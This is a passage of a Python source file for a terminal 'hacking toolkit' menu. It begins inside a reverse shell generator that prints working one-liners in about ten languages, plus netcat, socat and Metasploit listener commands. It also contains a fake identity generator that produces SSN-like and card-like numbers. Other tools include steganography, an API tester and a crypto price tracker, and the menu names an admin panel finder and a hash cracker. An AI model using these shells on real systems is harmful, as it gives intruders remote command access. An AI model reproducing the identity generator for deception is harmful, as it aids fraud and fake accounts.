        "Python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
        "PHP": f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "Perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'""",
        "Ruby": f"""ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
        "Netcat -e": f"""nc -e /bin/sh {lhost} {lport}""",
        "Netcat pipe": f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f""",
        "PowerShell": f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
        "Socat": f"""socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}""",
        "Lua": f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
        "Node.js": f"""require('child_process').exec('nc -e /bin/sh {lhost} {lport}')""",
    }
    
    # Listener commands
    listeners = {
        "Netcat": f"nc -lvnp {lport}",
        "Socat": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
        "Metasploit": f"msfconsole -x \"use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\"",
    }
    
    w = 56
    UI.box_top(w, f"REVERSE SHELLS — {lhost}:{lport}")
    UI.box_empty(w)
    
    for name, shell in shells.items():
        UI.box_line(w, f" {c.GB}▸ {c.c256(213)}{name}{c.RST}")
        # Wrap long shells
        for i in range(0, len(shell), 46):
            UI.box_line(w, f"   {c.c256(87)}{shell[i:i+46]}{c.RST}")
        UI.box_line(w, "")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.YB}🎧 LISTENER COMMANDS{c.RST}")
    for name, cmd in listeners.items():
        UI.box_line(w, f"   {c.GB}{name}: {c.WH}{cmd}{c.RST}")
    
    UI.box_empty(w)
    UI.box_bottom(w)
    
    # Export
    print()
    export = UI.input_prompt("Export to file? [y/n]")
    print(c.RST)
    if export.lower() == 'y':
        fp = os.path.expanduser(f"~/revshells_{lhost}_{lport}.txt")
        with open(fp, 'w') as f:
            f.write(f"Reverse Shells for {lhost}:{lport}\n{'='*50}\n\n")
            for name, shell in shells.items():
                f.write(f"[{name}]\n{shell}\n\n")
            f.write(f"\n{'='*50}\nLISTENERS:\n")
            for name, cmd in listeners.items():
                f.write(f"[{name}] {cmd}\n")
        UI.success(f"Saved to: {fp}")


# ═══════════════════════════════════════════
#  TOOL 09: FAKE IDENTITY GENERATOR
# ═══════════════════════════════════════════

def tool_fake_identity():
    UI.banner("🎭 FAKE IDENTITY GENERATOR")
    
    count = UI.input_prompt("How many identities? (default 3)")
    print(c.RST)
    count = int(count) if count.isdigit() else 3
    
    first_names_m = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Daniel",
                     "Andi","Budi","Cahya","Dimas","Eko","Fajar","Galih","Hadi","Ivan","Joko"]
    first_names_f = ["Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen","Lisa",
                     "Anisa","Bunga","Citra","Dewi","Eka","Fitri","Gita","Hana","Indah","Julia"]
    last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                  "Pratama","Wijaya","Santoso","Kusuma","Nugraha","Hidayat","Saputra","Ramadhan","Setiawan","Putra"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","mail.com"]
    streets = ["Oak St","Elm St","Main St","Park Ave","Cedar Ln","Maple Dr","Pine Rd","Jl. Merdeka","Jl. Sudirman","Jl. Gatot Subroto"]
    cities = ["New York","London","Tokyo","Jakarta","Singapore","Sydney","Berlin","Paris","Toronto","Seoul"]
    jobs = ["Software Engineer","Designer","Teacher","Doctor","Accountant","Marketing Manager","Data Analyst",
            "Freelancer","Student","Business Owner","Chef","Photographer","Writer","Developer"]
    
    for i in range(count):
        gender = random.choice(['M', 'F'])
        first = random.choice(first_names_m if gender == 'M' else first_names_f)
        last = random.choice(last_names)
        full_name = f"{first} {last}"
        
        age = random.randint(18, 65)
        birth_year = datetime.now().year - age
        birth_month = random.randint(1, 12)
        birth_day = random.randint(1, 28)
        dob = f"{birth_year}-{birth_month:02d}-{birth_day:02d}"
        
        email = f"{first.lower()}.{last.lower()}{random.randint(1,999)}@{random.choice(domains)}"
        phone = f"+{random.randint(1,99)}{random.randint(100,999)}{random.randint(1000000,9999999)}"
        address = f"{random.randint(1,9999)} {random.choice(streets)}, {random.choice(cities)}"
        
        # Generate SSN-like
        ssn = f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
        
        # Credit card (fake, Luhn-invalid)
        cc = f"{random.randint(4000,4999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
        cc_exp = f"{random.randint(1,12):02d}/{random.randint(25,30)}"
        cc_cvv = f"{random.randint(100,999)}"
        
        # MAC address
        mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
        
        # Password
        pwd = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
        
        # Username
        username = f"{first.lower()}{random.choice(['_','.','-',''])}{last.lower()}{random.randint(1,99)}"
        
        # User Agent
        agents = ["Chrome/120.0", "Firefox/121.0", "Safari/17.2", "Edge/120.0"]
        
        w = 52
        print()
        UI.box_top(w, f"IDENTITY #{i+1}")
        UI.box_empty(w)
        UI.box_line(w, f" {c.c256(213)}👤 PERSONAL{c.RST}")
        UI.box_line(w, f"   {c.YB}Name     {c.c256(245)}: {c.GB}{full_name}{c.RST}")
        UI.box_line(w, f"   {c.YB}Gender   {c.c256(245)}: {c.c256(87)}{'Male' if gender == 'M' else 'Female'}{c.RST}")
        UI.box_line(w, f"   {c.YB}Age      {c.c256(245)}: {c.c256(87)}{age}{c.RST}")
        UI.box_line(w, f"   {c.YB}DOB      {c.c256(245)}: {c.c256(87)}{dob}{c.RST}")
        UI.box_line(w, f"   {c.YB}SSN      {c.c256(245)}: {c.c256(87)}{ssn}{c.RST}")
        UI.box_line(w, f"   {c.YB}Job      {c.c256(245)}: {c.c256(87)}{random.choice(jobs)}{c.RST}")
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}📱 CONTACT{c.RST}")
        UI.box_line(w, f"   {c.YB}Email    {c.c256(245)}: {c.c256(87)}{email}{c.RST}")
        UI.box_line(w, f"   {c.YB}Phone    {c.c256(245)}: {c.c256(87)}{phone}{c.RST}")
        UI.box_line(w, f"   {c.YB}Address  {c.c256(245)}: {c.c256(87)}{address[:35]}{c.RST}")
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}💻 DIGITAL{c.RST}")
        UI.box_line(w, f"   {c.YB}Username {c.c256(245)}: {c.c256(87)}{username}{c.RST}")
        UI.box_line(w, f"   {c.YB}Password {c.c256(245)}: {c.c256(87)}{pwd}{c.RST}")
        UI.box_line(w, f"   {c.YB}MAC      {c.c256(245)}: {c.c256(87)}{mac}{c.RST}")
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}💳 FINANCIAL (FAKE){c.RST}")
        UI.box_line(w, f"   {c.YB}Card     {c.c256(245)}: {c.c256(87)}{cc}{c.RST}")
        UI.box_line(w, f"   {c.YB}Exp/CVV  {c.c256(245)}: {c.c256(87)}{cc_exp} / {cc_cvv}{c.RST}")
        UI.box_empty(w)
        UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 10: CRYPTO PRICE TRACKER
# ═══════════════════════════════════════════

def tool_crypto_tracker():
    UI.banner("📈 CRYPTO PRICE TRACKER")
    
    UI.spinner("Fetching live crypto prices...", 2)
    
    body, status, _ = http_get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,solana,cardano,ripple,dogecoin,polkadot,avalanche-2,chainlink,litecoin,polygon,toncoin,shiba-inu,tron&vs_currencies=usd&include_24hr_change=true&include_market_cap=true")
    
    if status != 200:
        UI.error("Failed to fetch crypto data")
        return
    
    try:
        data = json.loads(body)
    except:
        UI.error("Failed to parse data")
        return
    
    crypto_names = {
        'bitcoin': ('BTC', '₿'), 'ethereum': ('ETH', 'Ξ'), 'binancecoin': ('BNB', '◆'),
        'solana': ('SOL', '◎'), 'cardano': ('ADA', '₳'), 'ripple': ('XRP', '✕'),
        'dogecoin': ('DOGE', '🐕'), 'polkadot': ('DOT', '●'), 'avalanche-2': ('AVAX', '▲'),
        'chainlink': ('LINK', '⬡'), 'litecoin': ('LTC', 'Ł'), 'polygon': ('MATIC', '⬡'),
        'toncoin': ('TON', '💎'), 'shiba-inu': ('SHIB', '🐕'), 'tron': ('TRX', '⟁')
    }
    
    w = 56
    UI.box_top(w, "CRYPTO PRICES (LIVE)")
    UI.box_empty(w)
    UI.box_line(w, f" {c.YB}{'COIN':8s} {'PRICE (USD)':>14s} {'24H CHANGE':>12s}{c.RST}")
    UI.box_sep(w)
    
    for coin_id, info in data.items():
        symbol, icon = crypto_names.get(coin_id, (coin_id[:4].upper(), '●'))
        price = info.get('usd', 0)
        change = info.get('usd_24h_change', 0)
        mcap = info.get('usd_market_cap', 0)
        
        # Format price
        if price >= 1000:
            price_str = f"${price:,.2f}"
        elif price >= 1:
            price_str = f"${price:.4f}"
        else:
            price_str = f"${price:.8f}"
        
        # Change color
        if change and change > 0:
            change_str = f"{c.GB}+{change:.2f}%"
        elif change and change < 0:
            change_str = f"{c.RB}{change:.2f}%"
        else:
            change_str = f"{c.c256(245)}0.00%"
        
        UI.box_line(w, f" {c.c256(87)}{icon} {c.WH}{symbol:5s} {c.GB}{price_str:>14s} {change_str}{c.RST}")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.c256(245)}Updated: {datetime.now().strftime('%H:%M:%S')} | Source: CoinGecko{c.RST}")
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 11: STEGANOGRAPHY
# ═══════════════════════════════════════════

def tool_steganography():
    UI.banner("🔒 IMAGE STEGANOGRAPHY")
    
    print(f"    {c.GB}[{c.WH}1{c.GB}]{c.RST} {c.c256(87)}Hide message in image{c.RST}")
    print(f"    {c.GB}[{c.WH}2{c.GB}]{c.RST} {c.c256(87)}Extract message from image{c.RST}")
    print()
    choice = UI.input_prompt("Choose [1/2]")
    print(c.RST)
    
    if choice == "1":
        img_path = UI.input_prompt("Image file path (PNG/BMP)")
        message = UI.input_prompt("Secret message")
        output = UI.input_prompt("Output file path")
        print(c.RST)
        
        if not all([img_path, message, output]):
            UI.error("All fields required!")
            return
        
        if not os.path.isfile(img_path):
            UI.error("Image not found!")
            return
        
        UI.spinner("Hiding message in image...", 2)
        
        try:
            with open(img_path, 'rb') as f:
                img_data = bytearray(f.read())
            
            # Simple LSB steganography
            delimiter = "§§§END§§§"
            full_message = message + delimiter
            binary_msg = ''.join(format(ord(ch), '08b') for ch in full_message)
            
            if len(binary_msg) > len(img_data) - 100:
                UI.error("Message too long for this image!")
                return
            
            # Embed in LSB
            offset = 50  # Skip header
            for i, bit in enumerate(binary_msg):
                img_data[offset + i] = (img_data[offset + i] & 0xFE) | int(bit)
            
            with open(output, 'wb') as f:
                f.write(img_data)
            
            UI.success(f"Message hidden in: {output}")
            UI.info(f"Original size: {os.path.getsize(img_path):,} bytes")
            UI.info(f"Stego size: {os.path.getsize(output):,} bytes")
            
        except Exception as e:
            UI.error(f"Error: {e}")
    
    elif choice == "2":
        img_path = UI.input_prompt("Stego image file path")
        print(c.RST)
        
        if not os.path.isfile(img_path):
            UI.error("File not found!")
            return
        
        UI.spinner("Extracting hidden message...", 2)
        
        try:
            with open(img_path, 'rb') as f:
                img_data = f.read()
            
            # Extract LSB
            offset = 50
            binary_str = ''
            for i in range(offset, min(len(img_data), offset + 100000)):
                binary_str += str(img_data[i] & 1)
            
            # Convert binary to text
            message = ''
            for i in range(0, len(binary_str), 8):
                byte = binary_str[i:i+8]
                if len(byte) < 8:
                    break
                ch = chr(int(byte, 2))
                message += ch
                if message.endswith("§§§END§§§"):
                    message = message[:-9]
                    break
            
            if message and "§§§END§§§" not in message:
                # May not have found delimiter, show what we have
                message = message[:200]  # Limit output
            
            w = 52
            UI.box_top(w, "EXTRACTED MESSAGE")
            UI.box_empty(w)
            for i in range(0, len(message), 44):
                UI.box_line(w, f" {c.GB}{message[i:i+44]}{c.RST}")
            UI.box_empty(w)
            UI.box_bottom(w)
            
        except Exception as e:
            UI.error(f"Error: {e}")


# ═══════════════════════════════════════════
#  TOOL 12: REST API TESTER
# ═══════════════════════════════════════════

def tool_api_tester():
    UI.banner("🔌 REST API TESTER")
    
    url = UI.input_prompt("API URL")
    method = UI.input_prompt("Method [GET/POST/PUT/DELETE] (default GET)")
    print(c.RST)
    
    method = (method or "GET").upper()
    
    if not url:
        UI.error("URL required!")
        return
    
    if not url.startswith('http'):
        url = 'https://' + url
    
    headers_input = UI.input_prompt("Custom headers (key:value, comma-sep, or ENTER)")
    body_data = ""
    if method in ("POST", "PUT"):
        body_data = UI.input_prompt("Request body (JSON)")
    print(c.RST)
    
    UI.spinner(f"Sending {method} request...", 2)
    
    start_time = time.time()
    
    try:
        req = urllib.request.Request(url, method=method)
        req.add_header('User-Agent', 'KyyInfinite-API-Tester/3.0')
        req.add_header('Accept', 'application/json')
        
        if headers_input:
            for h in headers_input.split(','):
                if ':' in h:
                    k, v = h.split(':', 1)
                    req.add_header(k.strip(), v.strip())
        
        if body_data:
            req.add_header('Content-Type', 'application/json')
            req.data = body_data.encode()
        
        with urllib.request.urlopen(req, timeout=15) as resp:
            response_body = resp.read().decode('utf-8', errors='ignore')
            status = resp.status
            resp_headers = dict(resp.headers)
        
    except urllib.error.HTTPError as e:
        response_body = e.read().decode('utf-8', errors='ignore')
        status = e.code
        resp_headers = dict(e.headers)
    except Exception as e:
        UI.error(f"Request failed: {e}")
        return
    
    elapsed = time.time() - start_time
    
    # Try to pretty-print JSON
    try:
        json_body = json.loads(response_body)
        pretty_body = json.dumps(json_body, indent=2)
    except:
        pretty_body = response_body
    
    w = 56
    UI.box_top(w, f"API RESPONSE")
    UI.box_empty(w)
    
    status_color = c.GB if 200 <= status < 300 else (c.YB if 300 <= status < 400 else c.RB)
    
    UI.box_line(w, f" {c.YB}Method   {c.c256(245)}: {c.c256(87)}{method}{c.RST}")
    UI.box_line(w, f" {c.YB}URL      {c.c256(245)}: {c.c256(87)}{url[:40]}{c.RST}")
    UI.box_line(w, f" {c.YB}Status   {c.c256(245)}: {status_color}{status}{c.RST}")
    UI.box_line(w, f" {c.YB}Time     {c.c256(245)}: {c.c256(87)}{elapsed:.3f}s{c.RST}")
    UI.box_line(w, f" {c.YB}Size     {c.c256(245)}: {c.c256(87)}{len(response_body):,} bytes{c.RST}")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.c256(213)}Response Headers:{c.RST}")
    for k, v in list(resp_headers.items())[:8]:
        UI.box_line(w, f"   {c.c256(245)}{k}: {c.c256(87)}{v[:35]}{c.RST}")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.c256(213)}Response Body:{c.RST}")
    for line in pretty_body.split('\n')[:25]:
        UI.box_line(w, f"   {c.GB}{line[:48]}{c.RST}")
    
    if len(pretty_body.split('\n')) > 25:
        UI.box_line(w, f"   {c.c256(245)}... (truncated){c.RST}")
    
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  MAIN MENU (called from bash)
# ═══════════════════════════════════════════

TOOLS = {
    '1':  ('📸 Instagram Profile Scraper',     tool_instagram_scraper),
    '2':  ('🔓 Email Breach Checker',          tool_email_breach),
    '3':  ('🔎 Google Dorking Automator',      tool_google_dork),
    '4':  ('🕷️ Website Crawler & Extractor',    tool_web_crawler),
    '5':  ('📷 Image EXIF/Metadata Extractor',  tool_exif_extractor),
    '6':  ('🔐 Admin Panel Finder',            tool_admin_finder),
    '7':  ('🔓 Hash Cracker (Dictionary)',     tool_hash_cracker),
    '8':  ('🐚 Reverse Shell Generator',       tool_reverse_shell),
    '9':  ('🎭 Fake Identity Generator',       tool_fake_identity),
    '10': ('📈 Crypto Price Tracker (Live)',    tool_crypto_tracker),
    '11': ('🔒 Image Steganography',           tool_steganography),
    '12': ('🔌 REST API Tester',               tool_api_tester),
}

def show_menu():
    os.system('clear')
    print()
    
    # Banner
    print(f"    {c.c256(39)}╔══════════════════════════════════════════════════╗{c.RST}")
    print(f"    {c.c256(39)}║{c.RST}  {c.BLD}{c.c256(213)}🐍 KYYINFINITE PYTHON ENGINE v3.0{c.RST}                {c.c256(39)}║{c.RST}")
    print(f"    {c.c256(39)}║{c.RST}  {c.c256(245)}Advanced tools powered by Python{c.RST}                  {c.c256(39)}║{c.RST}")
    print(f"    {c.c256(39)}╠══════════════════════════════════════════════════╣{c.RST}")
    print(f"    {c.c256(39)}║{c.RST}                                                  {c.c256(39)}║{c.RST}")
    
    for key, (name, _) in TOOLS.items():
        num = f"{int(key):02d}"
        print(f"    {c.c256(39)}║{c.RST}  {c.GB}[{c.WH}{c.BLD}{num}{c.RST}{c.GB}]{c.RST} {c.c256(87)}{name}{c.RST}")
    
    print(f"    {c.c256(39)}║{c.RST}                                                  {c.c256(39)}║{c.RST}")
    print(f"    {c.c256(39)}║{c.RST}  {c.RB}[{c.WH}{c.BLD}00{c.RST}{c.RB}]{c.RST} {c.RB}← Back to Main Menu{c.RST}                     {c.c256(39)}║{c.RST}")
    print(f"    {c.c256(39)}║{c.RST}                                                  {c.c256(39)}║{c.RST}")
    print(f"    {c.c256(39)}╚══════════════════════════════════════════════════╝{c.RST}")
    print()
    
    choice = UI.input_prompt("Select tool")
    print(c.RST)
    
    return choice

def main():
    # If called with argument, run specific tool
    if len(sys.argv) > 1:
        tool_num = sys.argv[1]
        if tool_num in TOOLS:
            _, func = TOOLS[tool_num]
            func()
            UI.pause()
        elif tool_num == 'menu':
            while True:
                choice = show_menu()
                if choice in ('00', '0', 'q', 'quit', 'exit', ''):
                    break
                if choice in TOOLS:
                    _, func = TOOLS[choice]
                    func()
                    UI.pause()
                else:
                    UI.error("Invalid choice!")
                    time.sleep(1)
        else:
            UI.error(f"Unknown tool: {tool_num}")
    else:
        # Interactive menu
        while True:
            choice = show_menu()
            if choice in ('00', '0', 'q', 'quit', 'exit', ''):
                print(f"\n    {c.c256(87)}Returning to KyyInfinite...{c.RST}\n")
                break
            if choice in TOOLS:
                _, func = TOOLS[choice]
                func()
                UI.pause()
            else:
                UI.error("Invalid choice!")
                time.sleep(1)

if __name__ == '__main__':
    main()
